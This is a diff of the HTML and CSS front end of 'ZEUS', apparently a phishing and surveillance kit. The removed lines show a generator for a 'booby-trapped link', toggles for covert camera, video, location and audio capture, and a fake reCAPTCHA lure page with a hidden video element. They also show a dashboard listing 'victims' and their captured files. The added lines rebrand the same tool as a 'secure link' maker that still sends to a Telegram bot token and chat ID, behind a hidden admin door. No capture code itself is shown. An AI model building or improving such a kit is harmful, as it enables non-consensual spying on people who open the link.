-        .modal-error { color: var(--danger); font-size: 13px; margin-top: 12px; font-family: var(--font-en); display: none; }
-        .modal-error.show { display: block; }
-
-        .dev-close {
-            position: absolute;
-            top: 14px;
-            left: 18px;
-            background: none;
-            border: none;
-            color: var(--ink-faint);
-            font-size: 22px;
-            cursor: pointer;
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(184, 148, 46, 0.38);
         }
 
-        .dev-password-list { display: flex; flex-direction: column; gap: 12px; }
+        .btn-primary svg {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
 
-        .dev-password-item {
-            background: var(--bg-card);
-            border-radius: var(--radius-card);
-            padding: 14px 18px;
-            border: 1px solid var(--line);
+        .output-box {
             display: flex;
             align-items: center;
             justify-content: space-between;
+            gap: 14px;
             flex-wrap: wrap;
+            background: var(--bg-input);
+            border: 1px solid var(--line);
+            border-radius: var(--radius-card);
+            padding: 16px 20px;
+        }
+
+        .token-badge {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            color: var(--gold-deep);
+        }
+
+        [data-theme="dark"] .token-badge {
+            color: var(--gold-light);
+        }
+
+        .link-preview {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--ink-faint);
+            word-break: break-all;
+            margin-top: 2px;
+        }
+
+        .icon-actions {
+            display: flex;
             gap: 10px;
         }
 
-        .dev-password-item .pwd-value { font-family: var(--font-en); font-size: 16px; font-weight: 700; color: var(--gold); direction: ltr; word-break: break-all; }
-
-        .dev-password-item .pwd-copy {
-            background: var(--gold-soft);
+        .icon-btn {
+            width: 42px;
+            height: 42px;
+            border-radius: 13px;
             border: 1px solid var(--line);
-            color: var(--gold);
-            padding: 6px 14px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-family: var(--font-en);
-            font-size: 11px;
-            font-weight: 600;
-        }
-
-        #victimPage {
-            display: none;
-            justify-content: center;
-            align-items: center;
-            width: 100%;
-            min-height: 100vh;
-            background: #eef2f5;
-            padding: 16px;
-            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
-        }
-
-        [data-theme="dark"] #victimPage { background: #161412; }
-
-        #victimPage .captcha-wrapper {
-            width: 360px;
-            max-width: 100%;
-            background: #f9f9f9;
-            border: 1px solid #d3d3d3;
-            border-radius: 5px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
-        }
-
-        [data-theme="dark"] #victimPage .captcha-wrapper { background: #24211e; border-color: #4a4640; }
-
-        #victimPage .captcha-row { display: flex; align-items: center; padding: 15px 15px 12px 15px; gap: 12px; }
-        #victimPage .spinner input { display: none; }
-
-        #victimPage .checkmark {
-            width: 32px;
-            height: 32px;
-            border: 2px solid #c1c1c1;
-            border-radius: 3px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            background: white;
-            transition: 0.25s;
-            position: relative;
-        }
-
-        #victimPage .checkmark .tick {
-            width: 10px;
-            height: 18px;
-            border-right: 4px solid #00a651;
-            border-bottom: 4px solid #00a651;
-            transform: rotate(45deg);
-            opacity: 0;
-        }
-
-        #victimPage .checkmark .loader {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #e8f0fe;
-            border-top: 3px solid #1a73e8;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        #victimPage .spinner.loading .checkmark { border-color: #1a73e8; background: #e8f0fe; }
-        #victimPage .spinner.loading .checkmark .loader { display: block; }
-        #victimPage .spinner.success .checkmark { border-color: #00a651; background: #e6f4ea; }
-        #victimPage .spinner.success .checkmark .tick { opacity: 1; }
-
-        #victimPage .text { flex: 1; font-size: 17px; color: #333; text-align: center; user-select: none; }
-        [data-theme="dark"] #victimPage .text { color: #ddd; }
-        #victimPage .text.loading { color: #1a73e8; }
-        #victimPage .text.success { color: #00a651; }
-
-        #victimPage .logo-captcha { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #777; }
-        #victimPage .logo-captcha img { width: 38px; margin-bottom: 4px; }
-
-        #victimPage .captcha-footer {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 6px 14px;
-            background: #f1f3f4;
-            border-top: 1px solid #e5e7e9;
-            height: 36px;
-        }
-
-        [data-theme="dark"] #victimPage .captcha-footer { background: #2a2722; border-color: #3a3630; }
-        #victimPage .captcha-footer .brand { display: flex; align-items: center; gap: 8px; cursor: default; }
-        #victimPage .captcha-footer .brand svg { height: 22px; width: auto; }
-        #victimPage .captcha-footer .brand .google-text { font-size: 13px; font-weight: 500; color: #222; }
-        [data-theme="dark"] #victimPage .captcha-footer .brand .google-text { color: #ccc; }
-        #victimPage .captcha-footer .links { display: flex; align-items: center; gap: 8px; font-size: 11px; }
-        #victimPage .captcha-footer .links a { color: #555; text-decoration: none; }
-        [data-theme="dark"] #victimPage .captcha-footer .links a { color: #999; }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .progress-container { width: 100%; background: rgba(200, 200, 200, 0.3); height: 5px; display: none; }
-        .progress-container .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #1a73e8, #00a651); transition: width 0.25s ease; }
-        .progress-container.show { display: block; }
-
-        .last-update {
-            font-family: var(--font-en);
-            font-size: 11px;
-            color: var(--ink-faint);
-            text-align: center;
-            margin-top: 10px;
-            padding: 6px 12px;
             background: var(--bg-card);
-            border-radius: 30px;
-            border: 1px solid var(--line);
-            display: inline-block;
-        }
-
-        .last-update span { font-weight: 600; color: var(--gold); }
-
-        .toast-msg {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            background: var(--ink);
-            color: #fff;
-            padding: 12px 24px;
-            border-radius: 14px;
-            font-family: var(--font-en);
-            font-size: 13px;
-            font-weight: 500;
-            box-shadow: 0 12px 36px rgba(0, 0, 0, 0.25);
-            opacity: 0;
-            transform: translateY(16px);
-            transition: all 0.35s ease;
-            pointer-events: none;
-            z-index: 99999;
-            direction: ltr;
-        }
-
-        .toast-msg.show { opacity: 1; transform: translateY(0); }
-        .toast-msg.success { background: var(--success); }
-        .toast-msg.error { background: var(--danger); }
-        .toast-msg.warning { background: var(--gold); }
-
-        .secret-hint {
-            position: fixed;
-            bottom: 24px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.72);
-            color: #fff;
-            padding: 8px 22px;
-            border-radius: 30px;
-            font-family: var(--font-en);
-            font-size: 12px;
-            opacity: 0;
-            transition: opacity 0.4s ease;
-            pointer-events: none;
-            z-index: 99998;
-        }
-
-        .secret-hint.show { opacity: 1; }
-
-        .copy-inline {
-            background: none;
-            border: none;
-            color: var(--gold);
-            cursor: pointer;
-            padding: 2px 8px;
-            border-radius: 6px;
+            color: var(--ink-2);
             display: inline-flex;
             align-items: center;
-            gap: 4px;
-            font-family: var(--font-en);
-            font-size: 11px;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
         }
 
-        .copy-inline:hover { background: var(--gold-soft); }
-        #hiddenVideo { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        #hiddenCanvas { display: none; }
+        .icon-btn:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+        }
 
-        body.victim-mode .panel { display: none !important; }
-        body.victim-mode #victimPage { display: flex !important; }
-        body.admin-mode .panel { display: block !important; }
-        body.admin-mode #victimPage { display: none !important; }
+        .icon-btn svg {
+            width: 19px;
+            height: 19px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
 
-        @media (max-width: 900px) {
-            .dash-sidebar { width: 60px; padding: 12px 6px; }
-            .dash-sidebar .sidebar-label,
-            .dash-sidebar .nav-item span:not(.badge-nav) { display: none; }
-            .dash-sidebar .nav-item { justify-content: center; padding: 12px; }
-            .dash-content { padding: 16px; }
+        .modal-backdrop {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(12, 10, 8, 0.72);
+            backdrop-filter: blur(12px);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+            padding: 18px;
+        }
+
+        .modal-backdrop.active {
+            display: flex;
+        }
+
+        .modal-card {
+            max-width: 420px;
+            width: 100%;
+            background: var(--bg-panel);
+            border: 1px solid var(--line);
+            border-radius: var(--radius-card);
+            padding: 26px 24px;
+            text-align: center;
+        }
+
+        .modal-card h3 {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--gold-deep);
+            margin-bottom: 6px;
+        }
+
+        .modal-card p {
+            font-size: 14px;
+            color: var(--ink-faint);
+            margin-bottom: 16px;
+        }
+
+        .modal-btns {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 14px;
+        }
+
+        .btn-sec {
+            padding: 9px 22px;
+            border-radius: 999px;
+            border: 1px solid var(--line);
+            background: var(--bg-input);
+            color: var(--ink-2);
+            font-family: var(--font-main);
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .btn-conf {
+            padding: 9px 24px;
+            border-radius: 999px;
+            border: none;
+            background: var(--gold-shimmer);
+            color: #fff;
+            font-family: var(--font-main);
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+        }
+
+        .error-text {
+            color: var(--danger);
+            font-size: 14px;
+            font-weight: 700;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .error-text.show {
+            display: block;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 22px;
+            left: 50%;
+            transform: translateX(-50%) translateY(16px);
+            background: var(--ink);
+            color: #fff;
+            padding: 10px 22px;
+            border-radius: 999px;
+            font-size: 14px;
+            font-weight: 700;
+            opacity: 0;
+            pointer-events: none;
+            transition: var(--transition);
+            z-index: 1000;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
         }
     </style>
 </head>
 <body>
+    <div class="toast" id="toast"></div>
 
-    <div class="toast-msg" id="toast"></div>
-    <div class="secret-hint" id="secretHint">✓ تم فتح الباب السري</div>
-
-    <!-- ===== CODE MODAL ===== -->
-    <div class="code-modal" id="codeModal">
-        <div class="modal-box">
-            <div class="modal-title">ZEUS</div>
-            <div class="modal-sub">أدخل كود الداشبورد</div>
-            <div class="input-wrap">
-                <input type="text" id="codeInput" placeholder="••••••••••••••" autocomplete="off" />
+    <div class="modal-backdrop" id="secretModal">
+        <div class="modal-card">
+            <h3>الباب السري — ZEUS</h3>
+            <p>أدخل رمز الوصول الخاص باللوحة</p>
+            <div class="input-box">
+                <input type="password" id="secretCodeInput" placeholder="أدخل الرمز …" autocomplete="off" />
             </div>
-            <div class="modal-actions">
-                <button class="btn-confirm" id="codeConfirmBtn">تأكيد</button>
-                <button class="btn-cancel" id="codeCancelBtn">إلغاء</button>
+            <div class="error-text" id="secretError">الرمز غير صحيح</div>
+            <div class="modal-btns">
+                <button class="btn-conf" id="confirmSecretBtn">تأكيد</button>
+                <button class="btn-sec" id="cancelSecretBtn">إغلاق</button>
             </div>
-            <div class="modal-error" id="codeError">❌ الكود غير صحيح. حاول مجدداً.</div>
         </div>
     </div>
 
-    <!-- ===== ADMIN PANEL ===== -->
-    <div class="panel" id="adminPanel">
-        <div class="top">
-            <div class="brand" id="secretTrigger" title="انقر 3 مرات أو اضغط Ctrl+Shift+D لفتح لوحة التحكم">
-                <div class="logo" id="secretLogo">
-                    <svg viewBox="0 0 100 100" fill="none">
-                        <polygon points="50,5 85,25 85,75 50,95 15,75 15,25" stroke="#b8942e" stroke-width="2.5" class="pulse" />
-                        <polygon points="50,10 80,28 80,72 50,90 20,72 20,28" stroke="#b8942e" stroke-width="0.8" opacity="0.3" class="glow-ring" />
-                        <polygon points="50,20 75,50 50,80 25,50" stroke="#b8942e" stroke-width="2" />
-                        <polygon points="50,35 60,50 50,65 40,50" fill="#b8942e" />
-                        <circle cx="50" cy="12" r="2" fill="#b8942e" opacity="0.7" />
-                        <circle cx="77" cy="26" r="2" fill="#b8942e" opacity="0.7" />
-                        <circle cx="77" cy="74" r="2" fill="#b8942e" opacity="0.7" />
-                        <circle cx="50" cy="88" r="2" fill="#b8942e" opacity="0.7" />
-                        <circle cx="23" cy="74" r="2" fill="#b8942e" opacity="0.7" />
-                        <circle cx="23" cy="26" r="2" fill="#b8942e" opacity="0.7" />
-                    </svg>
+    <main class="panel">
+        <header class="top">
+            <button type="button" class="brand-lock-btn" id="zeusSecretBrand" title="رمز الباب السري مدمج في الشعار">
+                <!-- شعار ZEUS التقني مع رمز مفتاح/قفل الباب السري مدمج في قلب الشعار -->
+                <svg class="zeus-emblem" viewBox="0 0 64 64" fill="none" aria-label="شعار ZEUS">
+                    <polygon points="32,4 56,18 56,46 32,60 8,46 8,18" stroke="#b8942e" stroke-width="2.4" fill="rgba(184,148,46,0.08)" />
+                    <polygon points="32,10 50,21 50,43 32,54 14,43 14,21" stroke="#d9b84a" stroke-width="1.2" stroke-dasharray="4 3" />
+                    <!-- تجويف القفل المدمج في مركز الشعار -->
+                    <circle cx="32" cy="28" r="5.5" stroke="#b8942e" stroke-width="2.2" />
+                    <path d="M32 33.5V43.5M32 38.5H36.5" stroke="#b8942e" stroke-width="2.4" stroke-linecap="round" />
+                </svg>
+                <div>
+                    <span class="brand-title">ZEUS</span>
+                    <span class="brand-sub">إدارة التوكنات وقاعدة البيانات</span>
                 </div>
-                <div style="display:flex;align-items:center;flex-wrap:wrap;">
-                    <span class="name" id="secretName">ZEUS</span>
-                    <span class="name-tag">ULTRA V4.7</span>
-                </div>
-            </div>
-            <div class="info">
-                <div class="row">
-                    <svg class="icon" viewBox="0 0 24 24" stroke="currentColor">
+            </button>
+
+            <div class="meta-bar">
+                <div class="meta-pill" title="توقيت القاهرة — نظام 12 ساعة">
+                    <svg viewBox="0 0 24 24">
                         <circle cx="12" cy="12" r="9" />
-                        <path d="M12 7 L12 12 L15 13" />
+                        <path d="M12 7v5l3.5 2" stroke-linecap="round" />
                     </svg>
-                    <span class="time-val" id="timeDisplay">12:30</span>
+                    <span id="cairoClock12">--:--:-- AM</span>
                 </div>
-                <div class="row">
-                    <svg class="icon" viewBox="0 0 24 24" stroke="currentColor">
-                        <rect x="4" y="6" width="16" height="14" rx="2" />
-                        <path d="M8 3 L8 8 M16 3 L16 8" />
-                        <line x1="8" y1="11" x2="16" y2="11" />
-                        <circle cx="12" cy="14" r="1" fill="currentColor" />
+
+                <div class="meta-pill" title="تاريخ القاهرة">
+                    <svg viewBox="0 0 24 24">
+                        <rect x="3" y="5" width="18" height="16" rx="2.5" />
+                        <path d="M8 3v4M16 3v4M3 10h18" stroke-linecap="round" />
                     </svg>
-                    <span id="dateDisplay">26/11/2026</span>
+                    <span id="cairoDate">--/--/----</span>
                 </div>
-                <button class="theme-toggle" id="themeToggle" aria-label="تبديل الوضع">
-                    <svg viewBox="0 0 24 24"><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/><circle cx="12" cy="12" r="5"/></svg>
-                    <span id="themeLabel">فاتح</span>
+
+                <button type="button" class="theme-btn" id="themeSwitchBtn">
+                    <svg viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="4.5" />
+                        <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" stroke-linecap="round" />
+                    </svg>
+                    <span id="themeText">فاتح</span>
                 </button>
             </div>
-        </div>
+        </header>
 
-        <div class="grid">
+        <section class="grid">
             <div class="card">
-                <div class="label-wrap">
-                    <div class="label-left">
-                        <svg viewBox="0 0 24 24" stroke="currentColor">
-                            <rect x="3" y="3" width="18" height="18" rx="4" />
-                            <circle cx="12" cy="9" r="3" />
-                            <path d="M6 17 Q12 13 18 17" />
+                <div class="card-head">
+                    <div class="card-title-wrap">
+                        <svg viewBox="0 0 24 24">
+                            <rect x="3" y="4" width="18" height="16" rx="3" />
+                            <circle cx="12" cy="10.5" r="2.5" />
+                            <path d="M7.5 17.5c1.5-2 7.5-2 9 0" stroke-linecap="round" />
                         </svg>
-                        <span class="label">الايــــــدي</span>
+                        <span class="card-title">معرّف المستلم (Chat ID)</span>
                     </div>
                 </div>
-                <div class="input-wrap">
-                    <input type="text" id="chatIdInput" placeholder="أدخل الإيدي …" dir="ltr" />
+                <div class="input-box">
+                    <input type="text" id="chatIdField" placeholder="أدخل المعرّف الرقمي …" dir="ltr" />
                 </div>
             </div>
+
             <div class="card">
-                <div class="label-wrap">
-                    <div class="label-left">
-                        <svg viewBox="0 0 24 24" stroke="currentColor">
-                            <circle cx="12" cy="12" r="9" />
-                            <path d="M12 7 L12 12 L15 15" />
-                            <circle cx="12" cy="12" r="2" />
+                <div class="card-head">
+                    <div class="card-title-wrap">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M15 7a4 4 0 1 0-3.87 5H15l2 2 2-2 2 2 1-1-3-3h-4" stroke-linecap="round" stroke-linejoin="round" />
                         </svg>
-                        <span class="label">تـــــــوكن البـوت</span>
+                        <span class="card-title">توكن البوت (Bot Token)</span>
                     </div>
                 </div>
-                <div class="input-wrap">
-                    <input type="text" id="botTokenInput" placeholder="أدخل التوكن …" dir="ltr" />
+                <div class="input-box">
+                    <input type="password" id="botTokenField" placeholder="أدخل التوكن السري …" dir="ltr" />
                 </div>
             </div>
-        </div>
+        </section>
 
-        <div class="card" style="margin-top: 18px;">
-            <div class="label-wrap">
-                <div class="label-left">
-                    <svg viewBox="0 0 24 24" stroke="currentColor">
-                        <rect x="3" y="3" width="7" height="7" rx="1.5" />
-                        <rect x="14" y="3" width="7" height="7" rx="1.5" />
-                        <rect x="3" y="14" width="7" height="7" rx="1.5" />
-                        <rect x="14" y="14" width="7" height="7" rx="1.5" />
+        <section class="card">
+            <div class="card-head">
+                <div class="card-title-wrap">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M10 13a5 5 0 0 0 7.54.54l2.92-2.92a5 5 0 0 0-7.07-7.07l-1.72 1.71" stroke-linecap="round" />
+                        <path d="M14 11a5 5 0 0 0-7.54-.54l-2.92 2.92a5 5 0 0 0 7.07 7.07l1.71-1.71" stroke-linecap="round" />
                     </svg>
-                    <span class="label">المميـــــــزات</span>
-                </div>
-                <span style="font-family:var(--font-en);font-size:11px;color:var(--gold);" id="activeFeaturesCount">1 ميزة مفعّلة</span>
-            </div>
-            <div class="toggle-group">
-                <label class="zeus-toggle">
-                    <input type="checkbox" id="featureCamFront" checked />
-                    <span class="toggle-label">
-                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" /><circle cx="12" cy="12" r="3" /></svg>
-                        كاميرا أمامية
-                    </span>
-                    <span class="track"><span class="thumb"></span></span>
-                </label>
-                <label class="zeus-toggle">
-                    <input type="checkbox" id="featureCamBack" />
-                    <span class="toggle-label">
-                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" /><circle cx="12" cy="12" r="3" /></svg>
-                        كاميرا خلفية
-                    </span>
-                    <span class="track"><span class="thumb"></span></span>
-                </label>
-                <label class="zeus-toggle">
-                    <input type="checkbox" id="featureVideoFront" />
-                    <span class="toggle-label">
-                        <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="12" rx="2" /><polygon points="10,8 16,12 10,16" fill="currentColor" /></svg>
-                        فيديو أمامي
-                    </span>
-                    <span class="track"><span class="thumb"></span></span>
-                </label>
-                <label class="zeus-toggle">
-                    <input type="checkbox" id="featureVideoBack" />
-                    <span class="toggle-label">
-                        <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="12" rx="2" /><polygon points="10,8 16,12 10,16" fill="currentColor" /></svg>
-                        فيديو خلفي
-                    </span>
-                    <span class="track"><span class="thumb"></span></span>
-                </label>
-                <label class="zeus-toggle">
-                    <input type="checkbox" id="featureLocation" />
-                    <span class="toggle-label">
-                        <svg viewBox="0 0 24 24"><polygon points="12,3 20,8 18,18 12,21 6,18 4,8" /><circle cx="12" cy="12" r="3" /></svg>
-                        الموقع
-                    </span>
-                    <span class="track"><span class="thumb"></span></span>
-                </label>
-                <label class="zeus-toggle">
-                    <input type="checkbox" id="featureAudio" />
-                    <span class="toggle-label">
-                        <svg viewBox="0 0 24 24"><path d="M12 2v20" /><path d="M8 8a4 4 0 018 0v8a4 4 0 01-8 0" /></svg>
-                        تسجيل صوتي
-                    </span>
-                    <span class="track"><span class="thumb"></span></span>
-                </label>
-            </div>
-        </div>
-
-        <div class="card base-url-card" style="margin-top: 18px;">
-            <div class="label-wrap">
-                <div class="label-left">
-                    <svg viewBox="0 0 24 24" stroke="currentColor">
-                        <path d="M10 6 L21 6 M10 12 L18 12 M10 18 L15 18" />
-                        <path d="M4 6 L6 6 M4 12 L6 12 M4 18 L6 18" />
-                    </svg>
-                    <span class="label">الرابط الأساسي</span>
+                    <span class="card-title">الرابط الأساسي (Base URL)</span>
                 </div>
             </div>
-            <div class="input-wrap">
-                <input type="text" id="baseUrlInput" placeholder="https://example.com" dir="ltr" />
+            <div class="input-box">
+                <input type="url" id="baseUrlField" placeholder="https://example.com" dir="ltr" />
             </div>
-        </div>
+        </section>
 
-        <div class="generate-wrap">
-            <button class="btn-generate" id="genBtn">
-                <svg viewBox="0 0 24 24" stroke="currentColor">
-                    <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" />
-                    <polygon points="12,8 16,12 12,16 8,12" fill="currentColor" />
+        <div class="action-row">
+            <button type="button" class="btn-primary" id="createTokenBtn">
+                <svg viewBox="0 0 24 24">
+                    <polygon points="12,3 21,8.5 21,15.5 12,21 3,15.5 3,8.5" />
+                    <path d="M12 8v8M8 12h8" stroke-linecap="round" />
                 </svg>
-                <span>توليد الرابط الملغم</span>
+                <span>إنشاء توكن ورابط آمن</span>
             </button>
         </div>
 
-        <div class="result-section">
-            <div class="label-wrap">
-                <svg viewBox="0 0 24 24" stroke="currentColor">
-                    <path d="M10 14 L14 10" />
-                    <path d="M4 12 L8 8" opacity="0.5" />
-                    <path d="M20 12 L16 8" opacity="0.5" />
-                    <path d="M4 12 L8 16" opacity="0.5" />
-                    <path d="M20 12 L16 16" opacity="0.5" />
-                </svg>
-                <span class="section-title">الرابط الملغم</span>
-            </div>
-            <div class="result">
-                <div class="info-box">
-                    <span class="value" id="tokenDisplay">التوكن الخاص بك</span>
-                    <span class="sub" id="resultSub">الرابط المُلغَّم الخاص بك</span>
-                </div>
-                <div class="actions">
-                    <button id="copyBtn" aria-label="نسخ">
-                        <svg viewBox="0 0 24 24"><rect x="8" y="8" width="13" height="13" rx="2" /><path d="M4 16V4.5A1.5 1.5 0 0 1 5.5 3H16" /></svg>
-                    </button>
-                    <button id="openBtn" aria-label="فتح">
-                        <svg viewBox="0 0 24 24"><path d="M9 15L21 3M21 3h-7M21 3v7" /><path d="M19 13v6.5a1.5 1.5 0 0 1-1.5 1.5H4.5A1.5 1.5 0 0 1 3 19.5V6.5A1.5 1.5 0 0 1 4.5 5H11" /></svg>
-                    </button>
+        <section class="card" style="margin-top: 0;">
+            <div class="card-head">
+                <div class="card-title-wrap">
+                    <svg viewBox="0 0 24 24">
+                        <rect x="3" y="4" width="18" height="16" rx="2.5" />
+                        <path d="M7 9h10M7 13h6" stroke-linecap="round" />
+                    </svg>
+                    <span class="card-title">الرابط العام والتوكن الفريد</span>
                 </div>
             </div>
-        </div>
-
-        <div class="footer" onclick="window.open('https://t.me/xx_8k', '_blank')" title="اضغط للانتقال للتليجرام">
-            <span>تــم التطـــوير بواسطــــــة</span>
-            <span class="dev-name">أشـــــروف</span>
-            <span class="icon-badge">
-                <svg viewBox="0 0 24 24" stroke="currentColor">
-                    <polygon points="12,2 20,6 20,18 12,22 4,18 4,6" />
-                    <circle cx="12" cy="12" r="4" />
-                </svg>
-            </span>
-        </div>
-    </div>
-
-    <!-- ===== DASHBOARD ===== -->
-    <div class="dash-overlay" id="dashOverlay">
-        <div class="dash-container">
-            <div class="dash-header-bar">
-                <div class="dash-title">
-                    ZEUS
-                    <small>لوحة التحكم المتكاملة V4.7</small>
+            <div class="output-box">
+                <div>
+                    <div class="token-badge" id="generatedTokenText">لم يُنشأ بعد</div>
+                    <div class="link-preview" id="generatedLinkText">يظهر الرابط القصير هنا دون كشف بيانات الاعتماد</div>
                 </div>
-                <div class="dash-header-actions">
-                    <button id="dashSyncBtn" title="مزامنة من Google Sheet">مزامنة الشيت</button>
-                    <button id="dashExportBtn" title="تصدير نسخة احتياطية JSON">تصدير JSON</button>
-                    <button id="dashThemeToggle" aria-label="تبديل الوضع">
-                        <svg viewBox="0 0 24 24"><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/><circle cx="12" cy="12" r="5"/></svg>
-                    </button>
-                    <button class="dash-close" id="dashCloseBtn">✕ إغلاق اللوحة</button>
-                </div>
-            </div>
-
-            <div class="dash-body">
-                <div class="dash-sidebar" id="dashSidebar">
-                    <span class="sidebar-label">التنقل</span>
-                    <button class="nav-item active" data-view="overview">
-                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
-                        <span>نظرة عامة</span>
-                    </button>
-                    <button class="nav-item" data-view="bots">
-                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="4"/><circle cx="12" cy="9" r="3"/><path d="M6 17 Q12 13 18 17"/></svg>
-                        <span>البوتات</span>
-                        <span class="badge-nav" id="navBotCount">0</span>
-                    </button>
-                    <button class="nav-item" data-view="victims">
-                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/></svg>
-                        <span>الضحايا</span>
-                        <span class="badge-nav" id="navVictimCount">0</span>
-                    </button>
-                    <button class="nav-item" data-view="files">
-                        <svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
-                        <span>الملفات</span>
-                        <span class="badge-nav" id="navFileCount">0</span>
-                    </button>
-                    <button class="nav-item" data-view="logs">
-                        <svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h12M4 18h8"/></svg>
-                        <span>سجل العمليات</span>
-                    </button>
-                    <button class="nav-item" data-view="settings">
-                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H18a2 2 0 0 1-1.73-1 2 2 0 0 1 0-2 2 2 0 0 1 1.73-1h.22a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82"/><path d="M4.6 9a1.65 1.65 0 0 0-.33 1.82c.24.51.75.82 1.33.82h.22a2 2 0 0 1 1.73 1 2 2 0 0 1 0 2 2 2 0 0 1-1.73 1H5.6a1.65 1.65 0 0 0-1.51 1 1.65 1.65 0 0 0 .33 1.82"/></svg>
-                        <span>الإعدادات</span>
-                    </button>
-                    <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--line);">
-                        <button class="nav-item" id="dashDevPageBtn">
-                            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
-                            <span>صفحة المطور</span>
-                        </button>
-                    </div>
-                </div>
-
-                <div class="dash-content" id="dashContent">
-                    <div class="view active" id="view-overview">
-                        <div class="dash-stats-grid" id="overviewStats">
-                            <div class="dash-stat-card"><span class="stat-num" id="ovBots">0</span><div class="stat-label">البوتات</div></div>
-                            <div class="dash-stat-card"><span class="stat-num" id="ovVictims">0</span><div class="stat-label">الضحايا</div></div>
-                            <div class="dash-stat-card"><span class="stat-num" id="ovFiles">0</span><div class="stat-label">الملفات</div></div>
-                            <div class="dash-stat-card"><span class="stat-num" id="ovToday">0</span><div class="stat-label">زيارات اليوم</div></div>
-                        </div>
-                        <div class="detail-view">
-                            <div style="font-weight:700;font-family:var(--font-en);color:var(--gold);margin-bottom:12px;font-size:14px;">آخر النشاطات</div>
-                            <div id="recentLogs"><div class="empty-msg">لا توجد سجلات حديثة.</div></div>
-                        </div>
-                        <div style="text-align:left;margin-top:8px;">
-                            <span class="last-update" id="dashLastUpdate">آخر تحديث: <span>--:--:--</span></span>
-                        </div>
-                    </div>
-
-                    <div class="view" id="view-bots">
-                        <div class="dash-toolbar">
-                            <div class="search-wrap">
-                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
-                                <input type="text" id="botSearch" placeholder="بحث عن بوت …" />
-                            </div>
-                        </div>
-                        <div id="botListContainer"><div class="empty-msg">لا توجد بوتات.</div></div>
-                    </div>
-
-                    <div class="view" id="view-victims">
-                        <div class="dash-toolbar">
-                            <div class="search-wrap">
-                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
-                                <input type="text" id="victimSearch" placeholder="بحث عن ضحية …" />
-                            </div>
-                            <select class="filter-select" id="victimFilter">
-                                <option value="all">جميع الضحايا</option>
-                                <option value="today">اليوم</option>
-                            </select>
-                        </div>
-                        <div id="victimListContainer"><div class="empty-msg">لا توجد ضحايا.</div></div>
-                    </div>
-
-                    <div class="view" id="view-files">
-                        <div class="dash-toolbar">
